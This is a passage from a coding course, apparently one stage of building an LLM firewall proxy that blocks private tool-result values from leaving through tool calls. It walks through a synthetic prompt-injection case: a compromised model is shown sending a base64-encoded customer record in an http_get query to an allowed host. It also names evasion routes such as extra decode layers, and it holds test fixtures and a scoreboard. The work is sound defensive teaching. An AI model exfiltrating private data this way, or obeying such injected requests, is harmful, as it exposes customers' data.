In this stage, you'll connect private tool results to their calls and block
exports of protected values unless trusted policy permits the tool and
destination.

### Stop a permitted tool from exporting private data

An allowed browsing tool can still leak a customer record. In this synthetic
finale, an email asks the model to attach customer details to a browsing URL. No
heuristic signal fires and the mock classifier assigns `12`. The compromised
model returns `http_get` for `allowed.com`, a host the browsing policy permits.
Its query contains the private record in base64, split across stream chunks.

Stage 10 allows that action because the tool and hostname are approved. Add a
final authorization check that asks whether this particular data may leave
through this tool and destination.

### Read the trusted export policy

Add this optional top-level `exports` field to Stage 10's policy. The snippet
shows only the addition; keep the earlier policy fields alongside it:

```json
{
  "exports": {
    "private_tools": ["read_customer_record"],
    "allowed": [
      {
        "tool": "send_email",
        "destination_argument": "to",
        "email_domain": "crm.example.com"
      }
    ]
  }
}
```

A result produced by `read_customer_record` contains private values. Those
values may leave through `send_email` only when its top-level `to` argument
names a recipient at exactly `crm.example.com`. The browsing host allowlist does
not grant permission to export data. Tool names and argument keys are
case-sensitive. Read all names, keys and domains from trusted policy.

The supplied recipient format is a plain ASCII address with exactly one `@`, a
nonempty local part, and no spaces, control characters or DEL. Compare the
entire domain case-insensitively. Do not accept suffixes such as
`crm.example.com.evil.io`, a domain mentioned in the local part, display names
or multiple recipients. This is a small course address format, not a complete
email address validator. A missing or invalid destination cannot authorize an
export. A matching domain on a different tool cannot authorize it either.

An empty `allowed` list denies all private exports. An empty `private_tools`
list marks no results private. An absent `exports` field disables this added
check. Request text, advertised tools and tool-result names cannot change these
permissions.

The `private_tools` list identifies producers of private results in history; it
does not authorize new calls to those tools. The `allowed` list grants export
permission, while Stage 10's `tools` policy still controls which outgoing calls
are allowed. For the approved email example, also add `"send_email": {}` to
`tools`. An export permission cannot override a tool denial.

### Recover each private field from history

Every request carries the full conversation. Associate a `role: "tool"`
message's `tool_call_id` with the corresponding earlier assistant call's `id`.
Use that call's `function.name` to decide whether its result is private:

```json
{
  "model": "course-model",
  "messages": [
    {
      "role": "assistant",
      "content": null,
      "tool_calls": [
        {
          "id": "call_3",
          "type": "function",
          "function": { "name": "read_customer_record", "arguments": "{}" }
        }
      ]
    },
    {
      "role": "tool",
      "tool_call_id": "call_3",
      "content": "{\"customer_id\":\"Customer-4829\",\"email\":\"mira.chen@example.net\",\"notes\":\"Renewal plan May\"}"
    }
  ]
}
```

Results can return in a different order from the calls. A tool message's
optional `name` can be misleading. Neither adjacency nor that name supplies
provenance. Histories in this stage have unique call IDs and correctly linked
results. Private result content is a JSON object of named strings. Each value
has at least eight characters and remains nonempty after normalization.

Protect **each field value independently**, including an email extracted from
the record. Matching only the serialized record misses that leak. Public tool
results do not become private merely because they are tool output. Collect the
values from the original request before redaction, then discard the collection
when this request finishes. Rebuild it from each incoming request's history. If
that history repeats a private result, its values are protected again; if a
later request omits the result, don't remember its values from an earlier HTTP
request. Ordinary text-part messages remain supported.

### Match values in complete outgoing arguments

After the existing canary and tool authorization checks succeed, inspect every
outgoing call in every response choice. Parse its complete JSON-object argument
string. Recursively visit string **values**, including values inside objects and
arrays. Do not match object keys or numeric values.

For each string, inspect the string itself. If it is an absolute HTTP(S) URL,
also inspect each parsed query parameter value. Use standard query parsing,
including percent decoding and `+` as a space. This lets a query value
containing base64 be inspected independently of its surrounding URL. URL query
encoding must escape a literal base64 `+` as `%2B`.

For example, `https://allowed.com/collect?d=Q3VzdG9tZXItNDgyOQ==` contributes
both the full URL and the query value `Q3VzdG9tZXItNDgyOQ==`. Decoding that
query value yields `Customer-4829`, which matches one private field. Trying to
base64-decode the entire URL would miss it. Percent decoding query syntax is
separate from the single base64 decode layer.

For each candidate, use the normalization rules from earlier stages and one
standard-base64 decode layer followed by normalization, as before. Normalize
private values too, without decoding them. If normalization settings are absent,
use NFKC and case folding without extra character mappings, while still trying
one decode layer on candidates. Match a complete normalized private value as a
substring. Do not recursively decode, join separate argument strings, or infer
paraphrases. A partial value such as `Customer` is outside this rule's bound.

This export check always tries one base64 layer, including without a
`normalization` policy. If a candidate doesn't decode to valid UTF-8, skip its
decoded variant and keep inspecting the candidate itself.

If a call contains any protected value, require a matching approved export for
that call. Calls containing no private value remain subject to the earlier tool
policy and need no export permission. Existing tool authorization always
applies, including to an approved CRM export.

A denied non-streaming response returns HTTP `403` with the existing error
shape:

```json
{
  "error": {
    "message": "Blocked outgoing response",
    "type": "firewall_block",
    "rule": "private_export"
  }
}
```

Reject the whole response before releasing origin bytes or `X-Request-Id`.
Keep the firewall diagnostic headers. The error message must be nonempty and
must not echo private values or outgoing argument content. Allowed responses
retain their exact original bytes and metadata. Enforce this rule even in log
mode. Existing canary checks take precedence, followed by tool authorization,
followed by export authorization.

For streaming, reuse the completed, ordered tool-call batch assembled at
`[DONE]`. Check exports before releasing any call. One denied export discards
all calls and pending content, sends one terminal SSE error with
`rule: "private_export"`, and closes without `[DONE]`. HTTP status stays `200`.
Previously released safe text may remain. Approved calls keep their IDs, names
and exact argument strings. Safe text must continue to stream while tool calls
are pending.

### Tests

The tester writes policy and runs your proxy against local mocks:

```bash
./your_program.sh --origin http://127.0.0.1:8081 --detector http://127.0.0.1:8082 --policy /tmp/example/policy.json
```

Ports and the policy directory are allocated dynamically. The fixture policy
keeps earlier normalization, heuristics, classifier decisions and canary checks.
It allows `http_get` to `allowed.com`, `send_email`, and `get_weather`. Its
redaction pattern list is deliberately empty so the private record remains
visible to the synthetic compromised model. Earlier redaction checks still run
when their policies enable patterns.

The launch command starts only your firewall; the tester supplies the mock
services during tests. For a manual check, save the history example above as
`request.json`, save the expanded policy to a file, and use its absolute path
for `--policy`. Run an origin at `--origin` and, if classification is enabled,
a classifier at `--detector` returning `{"score":12}` for each message. Use
`"mode": "block"` and the fixture settings described above.

Leave your firewall running and send the saved history from another terminal:

```bash
curl --silent --include http://127.0.0.1:8080/v1/chat/completions \
  -H 'Authorization: Bearer course-test-key' \
  -H 'Content-Type: application/json' \
  --data-binary @request.json
```

The `--include` option shows the status and headers alongside the body. Configure
your origin to return the outgoing call described below in a completion, using
Stage 10's response format.

The first request includes the record above. The origin returns `http_get` with
arguments `{"url":"https://allowed.com/collect?d=Customer-4829"}`. Return the
HTTP `403` error shown above. The origin is contacted once, but the client must
receive no executable call.

The finale base64-encodes the same record into `?d=...` and divides its argument
string between two SSE events. Despite no heuristic signals, a scripted score of
`12`, and an approved browsing host, the client receives this terminal event:

```text
data: {"error":{"message":"Blocked outgoing tool call","type":"firewall_block","rule":"private_export"}}

```

The exact nonempty message may differ. There must be no tool fragment or
`[DONE]`, and the message must not echo protected values. To check streaming
manually, add `"stream": true` to `request.json`, use curl's `--no-buffer`
option, and configure your origin to split the call across SSE events followed
by `[DONE]`, as in Stage 10.

Controls send the same record through the approved CRM email tool, try
exporting only its email field, and send a non-private value through the
browsing URL. Changed policies, empty export permissions, log mode, complete
batches and separate requests also exercise the rule. Each request has a
five-second streaming or three-second non-streaming budget.

The tester replays 25 labeled attacks and 15 benign conversations using
synthetic responses and classifier scores. It counts verified client outcomes
and prints:

```text
Course test suite (synthetic): 25/25 attacks blocked; 0/15 benign conversations blocked
```

A decision trail identifies the finale's private source tool and `call_3`. These
are tester logs. Your program does not need to print a scoreboard or
explanation. Keep all earlier stages working.

### Notes

- This is bounded value matching, not full taint tracking. Paraphrases, partial
  values, multiple decode layers and other transformations can evade it. The
  scoreboard describes only these synthetic course fixtures, not model accuracy
  or a production security guarantee.
- The agent supplies complete, trustworthy history, routes all model traffic
  through the firewall, and executes only returned calls. This stage checks
  outgoing tool arguments, not every possible disclosure through ordinary text.
- No tool is executed or external fixture URL fetched. Production systems also
  need least privilege, trusted history, executor network controls and explicit
  authorization, as discussed in [OWASP's prompt injection guidance][owasp].

[owasp]:
  https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
